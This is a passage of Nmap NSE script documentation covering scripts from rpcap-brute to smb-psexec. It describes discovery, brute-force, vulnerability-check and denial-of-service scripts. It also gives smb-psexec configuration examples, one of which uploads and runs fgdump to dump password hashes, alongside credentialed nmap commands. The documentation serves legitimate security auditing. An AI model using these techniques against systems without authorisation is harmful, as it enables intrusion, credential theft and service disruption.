  the request sent the matching program number, and we proceed to extract the
  supported versions. A reply with an accept state RPC accept state 1 (remote
  hasn't exported program) means that we have sent the incorrect program number.
  Any other accept state is an incorrect behaviour.

rpcap-brute
Categories: intrusive brute
https://nmap.org/nsedoc/scripts/rpcap-brute.html
  Performs brute force password auditing against the WinPcap Remote Capture
  Daemon (rpcap).

rpcap-info
Categories: discovery safe
https://nmap.org/nsedoc/scripts/rpcap-info.html
  Connects to the rpcap service (provides remote sniffing capabilities
  through WinPcap) and retrieves interface information. The service can either be
  setup to require authentication or not and also supports IP restrictions.

rpcinfo
Categories: discovery default safe version
https://nmap.org/nsedoc/scripts/rpcinfo.html
  Connects to portmapper and fetches a list of all registered programs.  It then
  prints out a table including (for each program) the RPC program number,
  supported version numbers, port number and protocol, and program name.

rsa-vuln-roca
Categories: vuln safe
https://nmap.org/nsedoc/scripts/rsa-vuln-roca.html
  Detects RSA keys vulnerable to Return Of Coppersmith Attack (ROCA) factorization.

  SSH hostkeys and SSL/TLS certificates are checked. The checks require recent updates to the openssl NSE library.

  References:
  * https://crocs.fi.muni.cz/public/papers/rsa_ccs17

rsync-brute
Categories: brute intrusive
https://nmap.org/nsedoc/scripts/rsync-brute.html
  Performs brute force password auditing against the rsync remote file syncing protocol.

rsync-list-modules
Categories: discovery safe
https://nmap.org/nsedoc/scripts/rsync-list-modules.html
  Lists modules available for rsync (remote file sync) synchronization.

rtsp-methods
Categories: default safe
https://nmap.org/nsedoc/scripts/rtsp-methods.html
  Determines which methods are supported by the RTSP (real time streaming protocol) server.

rtsp-url-brute
Categories: brute intrusive
https://nmap.org/nsedoc/scripts/rtsp-url-brute.html
  Attempts to enumerate RTSP media URLS by testing for common paths on devices such as surveillance IP cameras.

  The script attempts to discover valid RTSP URLs by sending a DESCRIBE
  request for each URL in the dictionary. It then parses the response, based
  on which it determines whether the URL is valid or not.


rusers
Categories: discovery safe
https://nmap.org/nsedoc/scripts/rusers.html
  Connects to rusersd RPC service and retrieves a list of logged-in users.

s7-info
Categories: discovery version
https://nmap.org/nsedoc/scripts/s7-info.html
  Enumerates Siemens S7 PLC Devices and collects their device information. This
  script is based off PLCScan that was developed by Positive Research and
  Scadastrangelove (https://code.google.com/p/plcscan/). This script is meant to
  provide the same functionality as PLCScan inside of Nmap. Some of the
  information that is collected by PLCScan was not ported over; this
  information can be parsed out of the packets that are received.

  Thanks to Positive Research, and Dmitry Efanov for creating PLCScan

samba-vuln-cve-2012-1182
Categories: vuln intrusive
https://nmap.org/nsedoc/scripts/samba-vuln-cve-2012-1182.html
  Checks if target machines are vulnerable to the Samba heap overflow vulnerability CVE-2012-1182.

  Samba versions 3.6.3 and all versions previous to this are affected by
  a vulnerability that allows remote code execution as the "root" user
  from an anonymous connection.


  CVE-2012-1182 marks multiple heap overflow vulnerabilities located in
  PIDL based autogenerated code. This check script is based on PoC by ZDI
  marked as ZDI-CAN-1503. Vulnerability lies in ndr_pull_lsa_SidArray
  function where an attacker is under control of num_sids and can cause
  insufficient memory to be allocated, leading to heap buffer overflow
  and possibility of remote code execution.

  Script builds a malicious packet and makes a SAMR GetAliasMembership
  call which triggers the vulnerability. On the vulnerable system,
  connection is dropped and result is "Failed to receive bytes after 5 attempts".
  On patched system, samba throws an error and result is  "MSRPC call
  returned a fault (packet type)".

  References:
  * https://bugzilla.samba.org/show_bug.cgi?id=8815
  * http://www.samba.org/samba/security/CVE-2012-1182


servicetags
Categories: default discovery safe
https://nmap.org/nsedoc/scripts/servicetags.html
  Attempts to extract system information (OS, hardware, etc.) from the Sun Service Tags service agent (UDP port 6481).

  Based on protocol specs from
  http://arc.opensolaris.org/caselog/PSARC/2006/638/stdiscover_protocolv2.pdf
  http://arc.opensolaris.org/caselog/PSARC/2006/638/stlisten_protocolv2.pdf
  http://arc.opensolaris.org/caselog/PSARC/2006/638/ServiceTag_API_CLI_v07.pdf

shodan-api
Categories: discovery safe external
https://nmap.org/nsedoc/scripts/shodan-api.html
  Queries Shodan API for given targets and produces similar output to
  a -sV nmap scan. The ShodanAPI key can be set with the 'apikey' script
  argument, or hardcoded in the .nse file itself. You can get a free key from
  https://developer.shodan.io

  N.B if you want this script to run completely passively make sure to
  include the -sn -Pn -n flags.

sip-brute
Categories: intrusive brute
https://nmap.org/nsedoc/scripts/sip-brute.html
  Performs brute force password auditing against Session Initiation Protocol
  (SIP) accounts. This protocol is most commonly associated with VoIP sessions.

sip-call-spoof
Categories: discovery intrusive
https://nmap.org/nsedoc/scripts/sip-call-spoof.html
  Spoofs a call to a SIP phone and detects the action taken by the target (busy, declined, hung up, etc.)

  This works by sending a fake sip invite request to the target phone and checking
  the responses. A response with status code 180 means that the phone is ringing.
  The script waits for the next responses until timeout is reached or a special
  response is received.  Special responses include:  Busy (486), Decline (603),
  Timeout (408) or Hang up (200).

sip-enum-users
Categories: auth intrusive
https://nmap.org/nsedoc/scripts/sip-enum-users.html
  Enumerates a SIP server's valid extensions (users).

  The script works by sending REGISTER SIP requests to the server with the
  specified extension and checking for the response status code in order
  to know if an extension is valid. If a response status code is 401 or
  407, it means that the extension is valid and requires authentication. If the
  response status code is 200, it means that the extension exists and doesn't
  require any authentication while a 403 response status code means that
  extension exists but access is forbidden. To skip false positives, the script
  begins by sending a REGISTER request for a random extension and checking for
  response status code.

sip-methods
Categories: default safe discovery
https://nmap.org/nsedoc/scripts/sip-methods.html
  Enumerates a SIP Server's allowed methods (INVITE, OPTIONS, SUBSCRIBE, etc.)

  The script works by sending an OPTION request to the server and checking for
  the value of the Allow header in the response.

skypev2-version
Categories: version
https://nmap.org/nsedoc/scripts/skypev2-version.html
  Detects the Skype version 2 service.

smb-brute
Categories: intrusive brute
https://nmap.org/nsedoc/scripts/smb-brute.html
  Attempts to guess username/password combinations over SMB, storing discovered combinations
  for use in other scripts. Every attempt will be made to get a valid list of users and to
  verify each username before actually using them. When a username is discovered, besides
  being printed, it is also saved in the Nmap registry so other Nmap scripts can use it. That
  means that if you're going to run <code>smb-brute.nse</code>, you should run other <code>smb</code> scripts you want.
  This checks passwords in a case-insensitive way, determining case after a password is found,
  for Windows versions before Vista.

  This script is specifically targeted towards security auditors or penetration testers.
  One example of its use, suggested by Brandon Enright, was hooking up <code>smb-brute.nse</code> to the
  database of usernames and passwords used by the Conficker worm (the password list can be
  found at http://www.skullsecurity.org/wiki/index.php/Passwords, among other places.
  Then, the network is scanned and all systems that would be infected by Conficker are
  discovered.

  From the penetration tester perspective its use is pretty obvious. By discovering weak passwords
  on SMB, a protocol that's well suited for bruteforcing, access to a system can be gained.
  Further, passwords discovered against Windows with SMB might also be used on Linux or MySQL
  or custom Web applications. Discovering a password greatly beneficial for a pen-tester.

  This script uses a lot of little tricks that I (Ron Bowes) describe in detail in a blog
  posting, http://www.skullsecurity.org/blog/?p=164. The tricks will be summarized here, but
  that blog is the best place to learn more.

  Usernames and passwords are initially taken from the unpwdb library. If possible, the usernames
  are verified as existing by taking advantage of Windows' odd behaviour with invalid username
  and invalid password responses. As soon as it is able, this script will download a full list
  of usernames from the server and replace the unpw usernames with those. This enables the
  script to restrict itself to actual accounts only.

  When an account is discovered, it's saved in the <code>smb</code> module (which uses the Nmap
  registry). If an account is already saved, the account's privileges are checked; accounts
  with administrator privileges are kept over accounts without. The specific method for checking
  is by calling <code>GetShareInfo("IPC$")</code>, which requires administrative privileges. Once this script
  is finished (all other smb scripts depend on it, it'll run first), other scripts will use the saved account
  to perform their checks.

  The blank password is always tried first, followed by "special passwords" (such as the username
  and the username reversed). Once those are exhausted, the unpwdb password list is used.

  One major goal of this script is to avoid account lockouts. This is done in a few ways. First,
  when a lockout is detected, unless you user specifically overrides it with the <code>smblockout</code>
  argument, the scan stops. Second, all usernames are checked with the most common passwords first,
  so with not-too-strict lockouts (10 invalid attempts), the 10 most common passwords will still
  be tried. Third, one account, called the canary, "goes out ahead"; that is, three invalid
  attempts are made (by default) to ensure that it's locked out before others are.

  In addition to active accounts, this script will identify valid passwords for accounts that
  are disabled, guest-equivalent, and require password changes. Although these accounts can't
  be used, it's good to know that the password is valid. In other cases, it's impossible to
  tell a valid password (if an account is locked out, for example). These are displayed, too.
  Certain accounts, such as guest or some guest-equivalent, will permit any password. This
  is also detected. When possible, the SMB protocol is used to its fullest to get maximum
  information.

  When possible, checks are done using a case-insensitive password, then proper case is
  determined with a fairly efficient bruteforce. For example, if the actual password is
  "PassWord", then "password" will work and "PassWord" will be found afterwards (on the
  14th attempt out of a possible 256 attempts, with the current algorithm).

smb-double-pulsar-backdoor
Categories: vuln safe malware
https://nmap.org/nsedoc/scripts/smb-double-pulsar-backdoor.html
  Checks if the target machine is running the Double Pulsar SMB backdoor.

  Based on the python detection script by Luke Jennings of Countercept.
  https://github.com/countercept/doublepulsar-detection-script

smb-enum-domains
Categories: discovery intrusive
https://nmap.org/nsedoc/scripts/smb-enum-domains.html
  Attempts to enumerate domains on a system, along with their policies. This generally requires
  credentials, except against Windows 2000. In addition to the actual domain, the "Builtin"
  domain is generally displayed. Windows returns this in the list of domains, but its policies
  don't appear to be used anywhere.

  Much of the information provided is useful to a penetration tester, because it tells the
  tester what types of policies to expect. For example, if passwords have a minimum length of 8,
  the tester can trim his database to match; if the minimum length is 14, the tester will
  probably start looking for sticky notes on people's monitors.

  Another useful piece of information is the password lockouts. A penetration tester often wants
  to know whether or not there's a risk of negatively impacting a network, and this will
  indicate it. The SID is displayed, which may be useful in other tools; the users are listed,
  which uses different functions than <code>smb-enum-users.nse</code> (though likely won't
  get different results), and the date and time the domain was created may give some insight into
  its history.

  After the initial <code>bind</code> to SAMR, the sequence of calls is:
  * <code>Connect4</code>: get a connect_handle
  * <code>EnumDomains</code>: get a list of the domains (stop here if you just want the names).
  * <code>QueryDomain</code>: get the SID for the domain.
  * <code>OpenDomain</code>: get a handle for each domain.
  * <code>QueryDomainInfo2</code>: get the domain information.
  * <code>QueryDomainUsers</code>: get a list of the users in the domain.

smb-enum-groups
Categories: discovery intrusive
https://nmap.org/nsedoc/scripts/smb-enum-groups.html
  Obtains a list of groups from the remote Windows system, as well as a list of the group's users.
  This works similarly to <code>enum.exe</code> with the <code>/G</code> switch.

  The following MSRPC functions in SAMR are used to find a list of groups and the RIDs of their users. Keep
  in mind that MSRPC refers to groups as "Aliases".

  * <code>Bind</code>: bind to the SAMR service.
  * <code>Connect4</code>: get a connect_handle.
  * <code>EnumDomains</code>: get a list of the domains.
  * <code>LookupDomain</code>: get the RID of the domains.
  * <code>OpenDomain</code>: get a handle for each domain.
  * <code>EnumDomainAliases</code>: get the list of groups in the domain.
  * <code>OpenAlias</code>: get a handle to each group.
  * <code>GetMembersInAlias</code>: get the RIDs of the members in the groups.
  * <code>Close</code>: close the alias handle.
  * <code>Close</code>: close the domain handle.
  * <code>Close</code>: close the connect handle.

  Once the RIDs have been termined, the
  * <code>Bind</code>: bind to the LSA service.
  * <code>OpenPolicy2</code>: get a policy handle.
  * <code>LookupSids2</code>: convert SIDs to usernames.

  I (Ron Bowes) originally looked into the possibility of using the SAMR function <code>LookupRids2</code>
  to convert RIDs to usernames, but the function seemed to return a fault no matter what I tried. Since
  enum.exe also switches to LSA to convert RIDs to usernames, I figured they had the same issue and I do
  the same thing.

smb-enum-processes
Categories: discovery intrusive
https://nmap.org/nsedoc/scripts/smb-enum-processes.html
  Pulls a list of processes from the remote server over SMB. This will determine
  all running processes, their process IDs, and their parent processes. It is done
  by querying the remote registry service, which is disabled by default on Vista;
  on all other Windows versions, it requires Administrator privileges.

  Since this requires administrator privileges, it isn't especially useful for a
  penetration tester, since they can effectively do the same thing with metasploit
  or other tools. It does, however, provide for a quick way to get process lists
  for a bunch of systems at the same time.

  WARNING: I have experienced crashes in <code>regsvc.exe</code> while making registry calls
  against a fully patched Windows 2000 system; I've fixed the issue that caused
  it, but there's no guarantee that it (or a similar vulnerability in the same code) won't
  show up again. Since the process automatically restarts, it doesn't negatively
  impact the system, besides showing a message box to the user.

smb-enum-services
Categories: discovery intrusive safe
https://nmap.org/nsedoc/scripts/smb-enum-services.html
  Retrieves the list of services running on a remote Windows system.
  Each service attribute contains service name, display name and service status of
  each service.

  Note: Modern Windows systems requires a privileged domain account in order to
  list the services.

  References:
  * https://technet.microsoft.com/en-us/library/bb490995.aspx
  * https://en.wikipedia.org/wiki/Windows_service

smb-enum-sessions
Categories: discovery intrusive
https://nmap.org/nsedoc/scripts/smb-enum-sessions.html
  Enumerates the users logged into a system either locally or through an SMB share. The local users
  can be logged on either physically on the machine, or through a terminal services session.
  Connections to a SMB share are, for example, people connected to fileshares or making RPC calls.
  Nmap's connection will also show up, and is generally identified by the one that connected "0
  seconds ago".

  From the perspective of a penetration tester, the SMB Sessions is probably the most useful
  part of this program, especially because it doesn't require a high level of access. On, for
  example, a file server, there might be a dozen or more users connected at the same time. Based
  on the usernames, it might tell the tester what types of files are stored on the share.

  Since the IP they're connected from and the account is revealed, the information here can also
  provide extra targets to test, as well as a username that's likely valid on that target. Additionally,
  since a strong username to ip correlation is given, it can be a boost to a social engineering
  attack.

  Enumerating the logged in users is done by reading the remote registry (and therefore won't
  work against Vista, which disables it by default). Keys stored under <code>HKEY_USERS</code> are
  SIDs that represent the connected users, and those SIDs can be converted to proper names by using
  the <code>lsar.LsaLookupSids</code> function. Doing this requires any access higher than
  anonymous; guests, users, or administrators are all able to perform this request on Windows 2000,
  XP, 2003, and Vista.

  Enumerating SMB connections is done using the <code>srvsvc.netsessenum</code> function, which
  returns the usernames that are logged in, when they logged in, and how long they've been idle
  for. The level of access required for this varies between Windows versions, but in Windows
  2000 anybody (including the anonymous account) can access this, and in Windows 2003 a user
  or administrator account is required.

  I learned the idea and technique for this from Sysinternals' tool, <code>PsLoggedOn.exe</code>. I (Ron
  Bowes) use similar function calls to what they use (although I didn't use their source),
  so thanks go out to them. Thanks also to Matt Gardenghi, for requesting this script.

  WARNING: I have experienced crashes in regsvc.exe while making registry calls
  against a fully patched Windows 2000 system; I've fixed the issue that caused it,
  but there's no guarantee that it (or a similar vuln in the same code) won't show
  up again. Since the process automatically restarts, it doesn't negatively impact
  the system, besides showing a message box to the user.

smb-enum-shares
Categories: discovery intrusive
https://nmap.org/nsedoc/scripts/smb-enum-shares.html
  Attempts to list shares using the <code>srvsvc.NetShareEnumAll</code> MSRPC function and
  retrieve more information about them using <code>srvsvc.NetShareGetInfo</code>. If access
  to those functions is denied, a list of common share names are checked.

  Finding open shares is useful to a penetration tester because there may be private files
  shared, or, if it's writable, it could be a good place to drop a Trojan or to infect a file
  that's already there. Knowing where the share is could make those kinds of tests more useful,
  except that determining where the share is requires administrative privileges already.

  Running <code>NetShareEnumAll</code> will work anonymously against Windows 2000, and
  requires a user-level account on any other Windows version. Calling <code>NetShareGetInfo</code>
  requires an administrator account on all versions of Windows up to 2003, as well as Windows Vista
  and Windows 7, if UAC is turned down.

  Even if <code>NetShareEnumAll</code> is restricted, attempting to connect to a share will always
  reveal its existence. So, if <code>NetShareEnumAll</code> fails, a pre-generated list of shares,
  based on a large test network, are used. If any of those succeed, they are recorded.

  After a list of shares is found, the script attempts to connect to each of them anonymously,
  which divides them into "anonymous", for shares that the NULL user can connect to, or "restricted",
  for shares that require a user account.

smb-enum-users
Categories: auth intrusive
https://nmap.org/nsedoc/scripts/smb-enum-users.html
  Attempts to enumerate the users on a remote Windows system, with as much
  information as possible, through two different techniques (both over MSRPC,
  which uses port 445 or 139; see <code>smb.lua</code>). The goal of this script
  is to discover all user accounts that exist on a remote system. This can be
  helpful for administration, by seeing who has an account on a server, or for
  penetration testing or network footprinting, by determining which accounts
  exist on a system.

  A penetration tester who is examining servers may wish to determine the
  purpose of a server. By getting a list of who has access to it, the tester
  might get a better idea (if financial people have accounts, it probably
  relates to financial information). Additionally, knowing which accounts
  exist on a system (or on multiple systems) allows the pen-tester to build a
  dictionary of possible usernames for bruteforces, such as a SMB bruteforce
  or a Telnet bruteforce. These accounts may be helpful for other purposes,
  such as using the accounts in Web applications on this or other servers.

  From a pen-testers perspective, retrieving the list of users on any
  given server creates endless possibilities.

  Users are enumerated in two different ways:  using SAMR enumeration or
  LSA bruteforcing. By default, both are used, but they have specific
  advantages and disadvantages. Using both is a great default, but in certain
  circumstances it may be best to give preference to one.

  Advantages of using SAMR enumeration:
  * Stealthier (requires one packet/user account, whereas LSA uses at least 10 packets while SAMR uses half that; additionally, LSA makes a lot of noise in the Windows event log (LSA enumeration is the only script I (Ron Bowes) have been called on by the administrator of a box I was testing against).
  * More information is returned (more than just the username).
  * Every account will be found, since they're being enumerated with a function that's designed to enumerate users.

  Advantages of using LSA bruteforcing:
  * More accounts are returned (system accounts, groups, and aliases are returned, not just users).
  * Requires a lower-level account to run on Windows XP and higher (a 'guest' account can be used, whereas SAMR enumeration requires a 'user' account; especially useful when only guest access is allowed, or when an account has a blank password (which effectively gives it guest access)).

  SAMR enumeration is done with the  <code>QueryDisplayInfo</code> function.
  If this succeeds, it will return a detailed list of users, along with descriptions,
  types, and full names. This can be done anonymously against Windows 2000, and
  with a user-level account on other Windows versions (but not with a guest-level account).

  To perform this test, the following functions are used:
  * <code>Bind</code>: bind to the SAMR service.
  * <code>Connect4</code>: get a connect_handle.
  * <code>EnumDomains</code>: get a list of the domains.
  * <code>QueryDomain</code>: get the sid for the domain.
  * <code>OpenDomain</code>: get a handle for each domain.
  * <code>QueryDisplayInfo</code>: get the list of users in the domain.
  * <code>Close</code>: Close the domain handle.
  * <code>Close</code>: Close the connect handle.
  The advantage of this technique is that a lot of details are returned, including
  the full name and description; the disadvantage is that it requires a user-level
  account on every system except for Windows 2000. Additionally, it only pulls actual
  user accounts, not groups or aliases.

  Regardless of whether this succeeds, a second technique is used to pull
  user accounts, called LSA bruteforcing. LSA bruteforcing can be done anonymously
  against Windows 2000, and requires a guest account or better on other systems.
  It has the advantage of running with less permission, and will also find more
  account types (i.e., groups, aliases, etc.). The disadvantages is that it returns
  less information, and that, because it's a brute-force guess, it's possible to miss
  accounts. It's also extremely noisy.

  This isn't a brute-force technique in the common sense, however: it's a brute-forcing of users'
  RIDs. A user's RID is a value (generally 500, 501, or 1000+) that uniquely identifies
  a user on a domain or system. An LSA function is exposed which lets us convert the RID
  (say, 1000) to the username (say, "Ron"). So, the technique will essentially try
  converting 1000 to a name, then 1001, 1002, etc., until we think we're done.

  To do this, the script breaks users into groups of RIDs based on the <code>LSA_GROUPSIZE</code>
  constant. All members of this group are checked simultaneously, and the responses recorded.
  When a series of empty groups are found (<code>LSA_MINEMPTY</code> groups, specifically),
  the scan ends. As long as you are getting a few groups with active accounts, the scan will
  continue.

  Before attempting this conversion, the SID of the server has to be determined.
  The SID is determined by doing the reverse operation; that is, by converting a name into
  its RID. The name is determined by looking up any name present on the system.
  We try:
  * The computer name and domain name, returned in <code>SMB_COM_NEGOTIATE</code>;
  * An nbstat query to get the server name and the user currently logged in; and
  * Some common names: "administrator", "guest", and "test".

  In theory, the computer name should be sufficient for this to always work, and
  it has so far has in my tests, but I included the rest of the names for good measure. It
  doesn't hurt to add more.

  The names and details from both of these techniques are merged and displayed.
  If the output is verbose, then extra details are shown. The output is ordered alphabetically.

  Credit goes out to the <code>enum.exe</code>, <code>sid2user.exe</code>, and
  <code>user2sid.exe</code> programs for pioneering some of the techniques used
  in this script.

smb-flood
Categories: intrusive dos
https://nmap.org/nsedoc/scripts/smb-flood.html
  Exhausts a remote SMB server's connection limit by by opening as many
  connections as we can.  Most implementations of SMB have a hard global
  limit of 11 connections for user accounts and 10 connections for
  anonymous. Once that limit is reached, further connections are
  denied. This script exploits that limit by taking up all the
  connections and holding them.

  This works better with a valid user account, because Windows reserves
  one slot for valid users. So, no matter how many anonymous connections
  are taking up spaces, a single valid user can still log in.

  This is *not* recommended as a general purpose script, because a) it
  is designed to harm the server and has no useful output, and b) it
  never ends (until timeout).

smb-ls
Categories: discovery safe
https://nmap.org/nsedoc/scripts/smb-ls.html
  Attempts to retrieve useful information about files shared on SMB volumes.
  The output is intended to resemble the output of the UNIX <code>ls</code> command.

smb-mbenum
Categories: discovery safe
https://nmap.org/nsedoc/scripts/smb-mbenum.html
  Queries information managed by the Windows Master Browser.

smb-os-discovery
Categories: default discovery safe
https://nmap.org/nsedoc/scripts/smb-os-discovery.html
  Attempts to determine the operating system, computer name, domain, workgroup, and current
  time over the SMB protocol (ports 445 or 139).
  This is done by starting a session with the anonymous
  account (or with a proper user account, if one is given; it likely doesn't make
  a difference); in response to a session starting, the server will send back all this
  information.

  The following fields may be included in the output, depending on the
  circumstances (e.g. the workgroup name is mutually exclusive with domain and forest
  names) and the information available:
  * OS
  * Computer name
  * Domain name
  * Forest name
  * FQDN
  * NetBIOS computer name
  * NetBIOS domain name
  * Workgroup
  * System time

  Some systems, like Samba, will blank out their name (and only send their domain).
  Other systems (like embedded printers) will simply leave out the information. Other
  systems will blank out various pieces (some will send back 0 for the current
  time, for example).

  If this script is used in conjunction with version detection it can augment the
  standard nmap version detection information with data that this script has discovered.

  Retrieving the name and operating system of a server is a vital step in targeting
  an attack against it, and this script makes that retrieval easy. Additionally, if
  a penetration tester is choosing between multiple targets, the time can help identify
  servers that are being poorly maintained (for more information/random thoughts on
  using the time, see http://www.skullsecurity.org/blog/?p=76.

  Although the standard <code>smb*</code> script arguments can be used,
  they likely won't change the outcome in any meaningful way. However, <code>smbnoguest</code>
  will speed up the script on targets that do not allow guest access.

smb-print-text
Categories: intrusive
https://nmap.org/nsedoc/scripts/smb-print-text.html
  Attempts to print text on a shared printer by calling Print Spooler Service RPC functions.

  In order to use the script, at least one printer needs to be shared
  over SMB. If no printer is specified, script tries to enumerate existing
  ones by calling LANMAN API which might not be always available.
  LANMAN is available by default on Windows XP, but not on Vista or Windows 7
  for example. In that case, you need to specify printer share name manually
  using <code>printer</code> script argument. You can find out available shares
  by using smb-enum-shares script.

  Later versions of Windows require valid credentials by default
  which you can specify trough smb library arguments <code>smbuser</code> and
  <code>smbpassword</code> or other options.


smb-protocols
Categories: safe discovery
https://nmap.org/nsedoc/scripts/smb-protocols.html
  Attempts to list the supported protocols and dialects of a SMB server.

  The script attempts to initiate a connection using the dialects:
  * NT LM 0.12 (SMBv1)
  * 2.0.2      (SMBv2)
  * 2.1        (SMBv2)
  * 3.0        (SMBv3)
  * 3.0.2      (SMBv3)
  * 3.1.1      (SMBv3)

  Additionally if SMBv1 is found enabled, it will mark it as insecure. This
  script is the successor to the (removed) smbv2-enabled script.

smb-psexec
Categories: intrusive
https://nmap.org/nsedoc/scripts/smb-psexec.html
  Implements remote process execution similar to the Sysinternals' psexec
  tool, allowing a user to run a series of programs on a remote machine and
  read the output. This is great for gathering information about servers,
  running the same tool on a range of system, or even installing a backdoor on
  a collection of computers.

  This script can run commands present on the remote machine, such as ping or
  tracert, or it can upload a program and run it, such as pwdump6 or a
  backdoor. Additionally, it can read the program's stdout/stderr and return
  it to the user (works well with ping, pwdump6, etc), or it can read a file
  that the process generated (fgdump, for example, generates a file), or it
  can just start the process and let it run headless (a backdoor might run
  like this).

  To use this, a configuration file should be created and edited. Several
  configuration files are included that you can customize, or you can write
  your own. This config file is placed in <code>nselib/data/psexec</code> (if
  you aren't sure where that is, search your system for
  <code>default.lua</code>), then is passed to Nmap as a script argument (for
  example, myconfig.lua would be passed as
  <code>--script-args=config=myconfig</code>.

  The configuration file consists mainly of a module list. Each module is
  defined by a lua table, and contains fields for the name of the program, the
  executable and arguments for the program, and a score of other options.
  Modules also have an 'upload' field, which determines whether or not the
  module is to be uploaded. Here is a simple example of how to run <code>net
  localgroup administrators</code>, which returns a list of users in the
  "administrators" group (take a look at the <code>examples.lua</code>
  configuration file for these examples):

  <code>
    mod = {}
    mod.upload           = false
    mod.name             = "Example 1: Membership of 'administrators'"
    mod.program          = "net.exe"
    mod.args             = "localgroup administrators"
    table.insert(modules, mod)
  </code>

  <code>mod.upload</code> is <code>false</code>, meaning the program should
  already be present on the remote system (since 'net.exe' is on every version
  of Windows, this should be the case). <code>mod.name</code> defines the name
  that the program will have in the output. <code>mod.program</code> and
  <code>mod.args</code> obviously define which program is going to be run. The
  output for this script is this:

  <code>
    |  Example 1: Membership of 'administrators'
    |  | Alias name     administrators
    |  | Comment        Administrators have complete and unrestricted access to the computer/domain
    |  |
    |  | Members
    |  |
    |  | -------------------------------------------------------------------------------
    |  | Administrator
    |  | ron
    |  | test
    |  | The command completed successfully.
    |  |
    |  |_
  </code>

  That works, but it's really ugly. In general, we can use
  <code>mod.find</code>, <code>mod.replace</code>, <code>mod.remove</code>,
  and <code>mod.noblank</code> to clean up the output. For this example, we're
  going to use <code>mod.remove</code> to remove a lot of the useless lines,
  and <code>mod.noblank</code> to get rid of the blank lines that we don't
  want:

  <code>
    mod = {}
    mod.upload           = false
    mod.name             = "Example 2: Membership of 'administrators', cleaned"
    mod.program          = "net.exe"
    mod.args             = "localgroup administrators"
    mod.remove           = {"The command completed", "%-%-%-%-%-%-%-%-%-%-%-", "Members", "Alias name", "Comment"}
    mod.noblank          = true
    table.insert(modules, mod)
  </code>

  We can see that the output is now much cleaner:

  <code>
  |  Example 2: Membership of 'administrators', cleaned
  |  | Administrator
  |  | ron
  |  |_test
  </code>

  For our next command, we're going to run Windows' ipconfig.exe, which
  outputs a significant amount of unnecessary information, and what we do want
  isn't formatted very nicely. All we want is the IP address and MAC address,
  and we get it using <code>mod.find</code> and <code>mod.replace</code>:

  <code>
    mod = {}
    mod.upload           = false
    mod.name             = "Example 3: IP Address and MAC Address"
    mod.program          = "ipconfig.exe"
    mod.args             = "/all"
    mod.maxtime          = 1
    mod.find             = {"IP Address", "Physical Address", "Ethernet adapter"}
    mod.replace          = {{"%. ", ""}, {"-", ":"}, {"Physical Address", "MAC Address"}}
    table.insert(modules, mod)
  </code>

  This module searches for lines that contain "IP Address", "Physical
  Address", or "Ethernet adapter".  In these lines, a ". " is replaced with
  nothing, a "-" is replaced with a colon, and the term "Physical Address" is
  replaced with "MAC Address" (arguably unnecessary). Run ipconfig /all
  yourself to see what we start with, but here's the final output:

  <code>
  |  Example 3: IP Address and MAC Address
  |  | Ethernet adapter Local Area Connection:
  |  |    MAC Address: 00:0C:29:12:E6:DB
  |  |_   IP Address: 192.168.1.21|  Example 3: IP Address and MAC Address
  </code>

  Another interesting part of this script is that variables can be used in any
  script fields. There are two types of variables: built-in and user-supplied.
  Built-in variables can be anything found in the <code>config</code> table,
  most of which are listed below. The more interesting ones are:

  * <code>$lhost</code>: The address of the scanner
  * <code>$rhost</code>: The address being scanned
  * <code>$path</code>: The path where the scripts are uploaded
  * <code>$share</code>: The share where the script was uploaded

  User-supplied arguments are given on the commandline, and can be controlled
  by <code>mod.req_args</code> in the configuration file. Arguments are given
  by the user in --script-args; for example, to set $host to '1.2.3.4', the
  user would pass in --script-args=host=1.2.3.4. To ensure the user passes in
  the host variable, <code>mod.req_args</code> would be set to
  <code>{'host'}</code>.

  Here is a module that pings the local ip address:

  <code>
    mod = {}
    mod.upload           = false
    mod.name             = "Example 4: Can the host ping our address?"
    mod.program          = "ping.exe"
    mod.args             = "$lhost"
    mod.remove           = {"statistics", "Packet", "Approximate", "Minimum"}
    mod.noblank          = true
    mod.env              = "SystemRoot=c:\\WINDOWS"
    table.insert(modules, mod)
  </code>

  And the output:
  <code>
  |  Example 4: Can the host ping our address?
  |  | Pinging 192.168.1.100 with 32 bytes of data:
  |  | Reply from 192.168.1.100: bytes=32 time<1ms TTL=64
  |  | Reply from 192.168.1.100: bytes=32 time<1ms TTL=64
  |  | Reply from 192.168.1.100: bytes=32 time<1ms TTL=64
  |  |_Reply from 192.168.1.100: bytes=32 time<1ms TTL=64
  </code>

  And this module pings an arbitrary address that the user is expected to
  give:

  <code>
    mod = {}
    mod.upload           = false
    mod.name             = "Example 5: Can the host ping $host?"
    mod.program          = "ping.exe"
    mod.args             = "$host"
    mod.remove           = {"statistics", "Packet", "Approximate", "Minimum"}
    mod.noblank          = true
    mod.env              = "SystemRoot=c:\\WINDOWS"
    mod.req_args         = {'host'}
    table.insert(modules, mod)
  </code>

  And the output (note that we had to up the timeout so this would complete;
  we'll talk about override values later):

  <code>
  $ ./nmap -n -d -p445 --script=smb-psexec --script-args=smbuser=test,smbpass=test,config=examples,host=1.2.3.4 192.168.1.21
  [...]
  |  Example 5: Can the host ping 1.2.3.4?
  |  | Pinging 1.2.3.4 with 32 bytes of data:
  |  | Request timed out.
  |  | Request timed out.
  |  | Request timed out.
  |  |_Request timed out.
  </code>

  For the final example, we'll use the <code>upload</code> command to upload
  <code>fgdump.exe</code>, run it, download its output file, and clean up its
  logfile. You'll have to put <code>fgdump.exe</code> in the same folder as
  the script for this to work:

  <code>
    mod = {}
    mod.upload           = true
    mod.name             = "Example 6: FgDump"
    mod.program          = "fgdump.exe"
    mod.args             = "-c -l fgdump.log"
    mod.url              = "http://www.foofus.net/fizzgig/fgdump/"
    mod.tempfiles        = {"fgdump.log"}
    mod.outfile          = "127.0.0.1.pwdump"
    table.insert(modules, mod)
  </code>

  The <code>-l</code> argument for fgdump supplies the name of the logfile.
  That file is listed in the <code>mod.tempfiles</code> field. What, exactly,
  does <code>mod.tempfiles</code> do?  It simply gives the service a list of
  files to delete while cleaning up. The cleanup process will be discussed
  later.

  <code>mod.url</code> is displayed to the user if <code>mod.program</code>
  isn't found in <code>nselib/data/psexec/</code>. And finally,
  <code>mod.outfile</code> is the file that is downloaded from the system.
  This is required because fgdump writes to an output file instead of to
  stdout (pwdump6, for example, doesn't require <code>mod.outfile</code>.

  Now that we've seen a few possible combinations of fields, I present a
  complete list of all fields available and what each of them do. Many of them
  will be familiar, but there are a few that aren't discussed in the examples:

  * <code>upload</code> (boolean) true if it's a local file to upload, false
                        if it's already on the host machine. If
                        <code>upload</code> is true, <code>program</code> has
